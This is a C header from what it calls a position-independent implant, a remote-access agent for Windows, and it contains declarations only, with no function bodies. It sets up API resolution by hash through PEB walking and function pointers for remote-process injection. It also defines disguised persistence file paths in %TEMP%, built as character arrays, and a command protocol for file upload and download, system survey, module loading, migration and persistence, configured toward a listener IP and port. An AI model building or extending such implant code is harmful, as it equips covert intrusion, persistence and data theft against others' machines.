/*
    Config.h

    Configuration structure and declarations for PIC implant
*/
#pragma once

#include <winsock2.h>
#include <windows.h>
#include <intrin.h>
#include <TlHelp32.h>
#include <string.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <winternl.h>
// TLHelp has an annoying construct of defining structures and API calls and then if UNICODE, using macros to point to the W versions, so
//      the A versions are inaccessible
#undef PROCESSENTRY32
#undef MODULEENTRY32
#undef Process32First
#undef Process32Next
#undef Module32First
#undef Module32Next

// Constants for encryption method
#define PRIME1 7
#define PRIME2 11
#define PRIME3 13
#define PRIME4 17
#define KEY_LENGTH 4

// Constants for persistence locations
#define PERSIST_EXE_PATH { '%', 'T', 'E', 'M', 'P', '%', '\\', 'e', 'i', 'f', 's', 'b', 'o', 'o', 't', '.', 'e', 'x', 'e', '\0' }
#define PERSIST_DATA_PATH { '%', 'T', 'E', 'M', 'P', '%', '\\', 'c', 'o', 'r', 'e', 'd', 'a', 't', 'a', '.', 't', 'm', 'p', '\0' }

// ----------------------------- Import typdefs and IMPORTS struct ---------------------------------- //

// Redefine Win32 function signatures. This is necessary because the output
// of GetProcAddressWithHash is cast as a function pointer. Also, this makes
// working with these functions a joy in Visual Studio with Intellisense.

// -------------------- ws2_32 --------------------
typedef int (WINAPI* FuncWsaStartup) (
    _In_    uint16_t wVersionRequested,
    _Out_   LPWSADATA lpWSAData
    );

typedef SOCKET(WINAPI* FuncSocket) (
    _In_        int af,
    _In_        int type,
    _In_        int protocol
    );

typedef int (WINAPI* FuncCloseSocket) (
    _In_    SOCKET s
    );

typedef int (WINAPI* FuncWsaCleanup) ();

typedef int (WINAPI* FuncConnect) (
    _In_    SOCKET s,
    _In_    const SOCKADDR* name,
    _In_    int namelen
    );

typedef int (WINAPI* FuncSend) (
    _In_    SOCKET s,
    _In_    const char* buf,
    _In_    int len,
    _In_    int flags
    );

typedef int (WINAPI* FuncRecv) (
    _In_    SOCKET s,
    _Out_    char* buf,
    _In_    int len,
    _In_    int flags
    );

typedef int (WINAPI* FuncWSAGetLastError) ();

// -------------------- ntdll --------------------
typedef void * (WINAPI* FuncHeapAlloc) (
    _In_    HANDLE hHeap,
    _In_    uint32_t dwFlags,
    _In_    size_t dwBytes
    );

typedef ULONG (WINAPI* FuncDbgPrint) (
    _In_    const char* Format,
    ...
    );

typedef ULONG (WINAPI* FuncRtlGetVersion) (
    _Out_ PRTL_OSVERSIONINFOW lpVersionInformation
    );

// -------------------- kernel32 --------------------
typedef HMODULE(WINAPI* FuncLoadLibraryA) (
    _In_    const char* lpLibFileName
    );

typedef FARPROC(WINAPI* FuncGetProcAddress) (
    _In_    HMODULE hModule,
    _In_    LPCSTR  lpProcName
    );

typedef bool(WINAPI* FuncHeapFree) (
    _In_    HANDLE hHeap,
    _In_    uint32_t dwFlags,
    _In_    void* lpMem
    );

typedef HANDLE(WINAPI* FuncGetProcessHeap) ();

typedef LPVOID(WINAPI* FuncHeapReAlloc) (
    _In_    HANDLE hHeap,
    _In_    DWORD dwFlags,
    _In_    LPVOID lpMem, //_Frees_ptr_opt_ ??
    _In_    SIZE_T dwBytes
    );

typedef HANDLE(WINAPI* FuncCreateFileA) (
    _In_    const char* lpFileName,
    _In_    uint32_t dwDesiredAccess,
    _In_    uint32_t dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_    uint32_t dwCreationDisposition,
    _In_    uint32_t dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
    );

typedef HANDLE(WINAPI* FuncCreateFileW) (
    _In_    const wchar_t * lpFileName,
    _In_    uint32_t dwDesiredAccess,
    _In_    uint32_t dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_    uint32_t dwCreationDisposition,
    _In_    uint32_t dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
    );

typedef bool(WINAPI* FuncWriteFile) (
    _In_    HANDLE hFile,
    _In_    const void* lpBuffer,
    _In_    uint32_t nNumberOfBytesToWrite,
    _Out_    uint32_t* lpNumberOfBytesWritten,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
    );

typedef bool(WINAPI* FuncReadFile) (
    _In_    HANDLE hFile,
    _Out_    void* lpBuffer,
    _In_    uint32_t nNumberOfBytesToRead,
    _Out_opt_   uint32_t* lpNumberOfBytesRead,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
    );

typedef bool(WINAPI* FuncCloseHandle) (
    _In_    HANDLE hObject
    );

typedef DWORD(WINAPI* FuncGetFileSize) (
    _In_    HANDLE hFile,
    _Out_opt_ LPDWORD lpFileSizeHigh
    );

typedef DWORD(WINAPI* FuncGetFileSize) (
    _In_    HANDLE hFile,
    _Out_opt_ LPDWORD lpFileSizeHigh
    );

typedef HANDLE (WINAPI* FuncCreateToolhelp32Snapshot) (
    _In_    DWORD dwFlags,
    _In_    DWORD th32ProcessID
    );

typedef bool (WINAPI* FuncProcess32First) (
    _In_    HANDLE hSnapshot,
    _Inout_ LPPROCESSENTRY32 lppe
    );

typedef bool (WINAPI* FuncProcess32Next) (
    _In_    HANDLE hSnapshot,
    _Out_ LPPROCESSENTRY32 lppe
    );

typedef DWORD(WINAPI* FuncGetCurrentProcessId) ();

typedef DWORD(WINAPI* FuncGetModuleFileNameA) (
    _In_opt_    HMODULE hModule,
    _Out_       LPSTR lpFileName,
    _In_        DWORD nSize
    );

typedef HANDLE(WINAPI* FuncGetCurrentProcess) ();

typedef void* (WINAPI* FuncVirtualAlloc) (
    _In_opt_    void* lpAddress,
    _In_        size_t dwSize,
    _In_        DWORD flAllocationType,
    _In_        DWORD flProtect
    );

typedef bool (WINAPI* FuncVirtualFree) (
    _In_        void* lpAddress,
    _In_        size_t dwSize,
    _In_        DWORD dwFreeType
    );

typedef size_t (WINAPI* FuncVirtualQuery) (
    _In_opt_    const void * lpAddress,
    _Out_       PMEMORY_BASIC_INFORMATION lpBuffer,
    _In_        size_t dwLength
    );

typedef HANDLE(WINAPI* FuncOpenProcess) (
    _In_    DWORD dwDesiredAccess,
    _In_    bool bInheritHandle,
    _In_    DWORD dwProcessID
    );

typedef void * (WINAPI* FuncVirtualAllocEx) (
    _In_           HANDLE hProcess,
    _In_opt_       void * lpAddress,
    _In_           size_t dwSize,
    _In_           DWORD  flAllocationType,
    _In_           DWORD  flProtect
    );

typedef bool (WINAPI* FuncWriteProcessMemory) (
    _In_  HANDLE  hProcess,
    _In_  void *  lpBaseAddress,
    _In_  const void * lpBuffer,
    _In_  size_t  nSize,
    _Out_opt_ size_t * lpNumberOfBytesWritten
    );

typedef HANDLE (WINAPI* FuncCreateRemoteThread) (
    _In_  HANDLE                 hProcess,
    _In_opt_  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    _In_  size_t                 dwStackSize,
    _In_  LPTHREAD_START_ROUTINE lpStartAddress,
    _In_  void *                 lpParameter,
    _In_  DWORD                  dwCreationFlags,
    _Out_opt_ DWORD *                lpThreadId
    );

typedef DWORD (WINAPI* FuncExpandEnvironmentStringsW) (
    _In_            LPCWSTR lpSrc,
    _Out_opt_       LPWSTR  lpDst,
    _In_            DWORD   nSize
    );

typedef bool (WINAPI* FuncDeleteFileW) (
    _In_ LPCWSTR    lpFileName
    );

typedef _Post_equals_last_error_ DWORD (WINAPI* FuncGetLastError) ();

typedef void (WINAPI* FuncGetSystemTime) (
    _Out_ LPSYSTEMTIME  LPSYSTEMTIME
    );

// -------------------- advapi --------------------
typedef bool(WINAPI* FuncOpenProcessToken) (
    _In_    HANDLE ProcessHandle,
    _In_    DWORD DesiredAccess,
    _Out_   PHANDLE TokenHandle
    );

typedef bool (WINAPI* FuncGetTokenInformation) (
    _In_        HANDLE  TokenHandle,
    _In_        TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_opt_   LPVOID  TokenInformation,
    _In_        DWORD   TokenInformationLength,
    _Out_       PDWORD  ReturnLength
    );

typedef bool (WINAPI* FuncLookupPrivilegeNameA) (
    _In_opt_    LPCSTR  lpSystemName,
    _In_        PLUID   lpLuid,
    _Out_opt_   LPSTR   lpName,
    _Inout_     LPDWORD cchName
    );

typedef LSTATUS (WINAPI* FuncRegGetValueW) (
    _In_                HKEY    hkey,
    _In_opt_            LPCWSTR lpSubKey,
    _In_opt_            LPCWSTR lpValue,
    _In_opt_            DWORD   dwFlags,
    _Out_opt_           LPDWORD pdwType,
    _Out_opt_           PVOID   pvData,
    _Inout_opt_         LPDWORD pcbData
    );

typedef LSTATUS (WINAPI* FuncRegDeleteKeyValueW) (
    _In_           HKEY    hKey,
    _In_opt_       LPCWSTR lpSubKey,
    _In_opt_       LPCWSTR lpValueName
    );

typedef LSTATUS (WINAPI* FuncRegSetKeyValueW)(
    _In_           HKEY    hKey,
    _In_opt_       LPCWSTR lpSubKey,
    _In_opt_       LPCWSTR lpValueName,
    _In_           DWORD   dwType,
    _In_opt_       LPCVOID lpData,
    _In_           DWORD   cbData
    );

// -------------------- msvcrt --------------------
typedef int (WINAPI* FuncSnprintf) (
    _In_    char* buffer,
    _In_    size_t count,
    _In_    const char* format,
    ...
    );

typedef int (WINAPI* FuncVsnprintf) (
    _In_    char* buffer,
    _In_    size_t  count,
    _In_    const char* format,
    _In_    va_list argptr
    );

typedef errno_t(WINAPI* FuncMemcpy_s) (
    _In_    void* dest,
    _In_    size_t destSize,
    _In_    void* src,
    _In_    size_t count
    );

typedef size_t (WINAPI* FuncWcslen)(
    const wchar_t* str
    );


typedef struct _IMPORTS {
    // -------------------- ws2_32 --------------------
    FuncWsaStartup                  WSAStartup;
    FuncWsaCleanup                  WSACleanup;
    FuncSocket                      Socket;
    FuncCloseSocket                 CloseSocket;
    FuncConnect                     Connect;
    FuncSend                        Send;
    FuncRecv                        Recv;
    FuncWSAGetLastError             WSAGetLastError;

    // -------------------- ntdll --------------------
    FuncHeapAlloc                   HeapAlloc;
    FuncDbgPrint                    DbgPrint;
    FuncRtlGetVersion               RtlGetVersion;

    // -------------------- kernel32 --------------------
    FuncLoadLibraryA                LoadLibraryA;
    FuncGetProcAddress              GetProcAddress;
    FuncHeapFree                    HeapFree;
    FuncGetProcessHeap              GetProcessHeap;
    FuncHeapReAlloc                 HeapReAlloc;
    FuncCreateFileA                 CreateFileA;
    FuncCreateFileW                 CreateFileW;
    FuncWriteFile                   WriteFile;
    FuncReadFile                    ReadFile;
    FuncCloseHandle                 CloseHandle;
    FuncGetFileSize                 GetFileSize;
    FuncCreateToolhelp32Snapshot    CreateToolhelp32Snapshot;
    FuncProcess32First              Process32First;
    FuncProcess32Next               Process32Next;
    FuncGetCurrentProcessId         GetCurrentProcessId;
    FuncGetModuleFileNameA          GetModuleFileNameA;
    FuncGetCurrentProcess           GetCurrentProcess;
    FuncVirtualAlloc                VirtualAlloc;
    FuncVirtualFree                 VirtualFree;
    FuncVirtualQuery                VirtualQuery;
    FuncOpenProcess                 OpenProcess;
    FuncVirtualAllocEx              VirtualAllocEx;
    FuncWriteProcessMemory          WriteProcessMemory;
    FuncCreateRemoteThread          CreateRemoteThread;
    FuncExpandEnvironmentStringsW   ExpandEnvironmentStringsW;
    FuncDeleteFileW                 DeleteFileW;
    FuncGetLastError                GetLastError;
    FuncGetSystemTime               GetSystemTime;

    // -------------------- advapi --------------------
    FuncOpenProcessToken            OpenProcessToken;
    FuncGetTokenInformation         GetTokenInformation;
    FuncLookupPrivilegeNameA        LookupPrivilegeNameA;
    FuncRegGetValueW                RegGetValueW;
    FuncRegDeleteKeyValueW          RegDeleteKeyValueW;
    FuncRegSetKeyValueW             RegSetKeyValueW;

    // -------------------- msvcrt --------------------
    FuncSnprintf                    snprintf;
    FuncVsnprintf                   vsnprintf;
    FuncMemcpy_s                    memcpy_s;
    FuncWcslen                      wcslen;

} IMPORTS, *PIMPORTS;
typedef const IMPORTS* PCIMPORTS;


// ----------------------------- MESSAGE, MESSAGE_TYPES, Modules typedefs, MODULES, and CONFIG struct ---------------------------------- //

#pragma pack(push, 1)
#pragma warning(disable:4200)
typedef struct _MESSAGE {
    uint32_t Type;
    uint32_t Length;
    uint8_t  Value[];
} MESSAGE, *PMESSAGE;
#pragma pack(pop)

typedef enum MESSAGE_TYPE {
    DISCONNECT,
    OK = 1, // Python's Enums start at 1, so we start this one at 1 as well
    ERR,
    MISS,
    REQUEST_TASKING,
    TASKING_DONE,
    PUT_FILE,
    GET_FILE,
    SURVEY,
    ADD_MODULE,
    PERSIST,
    MIGRATE,
    CLEANUP,
    TEST
} MESSAGE_TYPE;

typedef bool(*ModuleTest)(
    uint8_t * Config,
    unsigned * DataLen,
    uint8_t ** Data
    );

typedef bool(*ModuleMigrate)(
    uint8_t * Config,
    PMESSAGE Message
    );

typedef bool(*ModulePersist)(
    uint8_t* Config,
    PMESSAGE Message
    );

typedef struct _MODULES {
    ModuleTest      Test;
    ModuleMigrate   Migrate;
    ModulePersist   Persist;
} MODULES, * PMODULES;
typedef const MODULES* PCMODULES;


#pragma pack(push, 1)
typedef struct _CONFIG {
    uint8_t *                       ImplantEntry;
    uint32_t                        ImplantSize;
    uint32_t                        ListenerIpAddress;
    uint16_t                        ListenerPort;
    uint8_t                         KeyShifts[4];
    uint8_t                         align1[10];          // Assure proper alignment for Imports
    PIMPORTS                        Imports;
    PMODULES                        Modules;
    SOCKET                          Socket;
} CONFIG, * PCONFIG;
#pragma pack(pop)
typedef const CONFIG* PCCONFIG;


/*
* @brief Interprets a message as a Put File, write to disk, command
* and calls necessary Windows APIs to create / write to a file
* @param[in] Config network context and dynamic imports
* @param[in] Message Pointer to message containing PutFile command data
* @return status of create / write operation
*/
bool PutFile(PCONFIG Config, PMESSAGE Message);


/*
* @brief Interprets a message as a Get File, read from disk, command
* and calls necessary Windows APIs to open / read from a file
* @param[in] Config network context and dynamic imports
* @param[in] Message Pointer to message containing GetFile command data
* @param[out], Address of unsigned to output number of data bytes read
* @param[out], Address of uint8_t pointer to output resulting data buffer (must be freed with HeapFree after use)
* @return status of open / read operation, false = failure
*/
bool GetFile(PCONFIG Config, PMESSAGE Message, unsigned* DataLen, uint8_t** Data);


/*
* @brief Interprets a message as a Survey, get system information, command
* and calls necessary Windows APIs to read current OS version, process list, etc.
* @param[in] Config network context and dynamic imports
* @param[in] Message Pointer to message containing GetFile command data
* @param[out], Address of unsigned to output number of data bytes read
* @param[out], Address of uint8_t pointer to output resulting data buffer (must be freed with HeapFree after use)
* @return status of survey operations, false = failure
*/
bool Survey(PCONFIG Config, PMESSAGE Message, unsigned* MsgDataLen, uint8_t** MsgData);

/*
* @brief Interprets a message as an AddModule command, allocating memory for the
* given message and copying message contents (assumed to be compiled PIC) into it
* @param[in] Config network context and dynamic imports
* @param[in] Message Pointer to message containing AddModule command data
* @param[in, out] Modules Pointer to struct containing function pointers to loaded modules
* @return status of add module operations, false = failure
*/
bool AddModule(PCONFIG Config, PMESSAGE Message);


// ----------------------------- GetProcAddressWithHash.h below ---------------------------------- //

// This compiles to a ROR instruction
// This is needed because _lrotr() is an external reference
// Also, there is not a consistent compiler intrinsic to accomplish this across all three platforms.
#define ROTR32(value, shift)    (((uint32_t) value >> (uint8_t) shift) | ((uint32_t) value << (32 - (uint8_t) shift)))


// Redefine PEB structures. The structure definitions in winternl.h are incomplete.
typedef struct _MY_PEB_LDR_DATA {
    uint32_t Length;
    bool Initialized;
    void* SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;


typedef struct _MY_LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    uint32_t SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

/**
 * @brief Resolve all needed imports into config block
 * @remark In order to more easily move from Implant DLL to Implant PIC, this function is listed in this shared header
 */
 bool LinkImports(PIMPORTS Imports);


 HMODULE GetProcAddressWithHash(_In_ uint32_t dwModuleFunctionHash);

// Macro for inserting DbgPrint only when in _DEBUG mode
#if _DEBUG
/*
 * @param print_func, function pointer to the dynamically linked DbgPrint
 * @param fmt, the format string content
 * @param VAR_ARGS, the format string members
 */
#define DBGPRINT(func, fmt, ...) { \
        func(fmt, __VA_ARGS__); }
#else
#define DBGPRINT(...)           (void)0     // do nothing
#endif

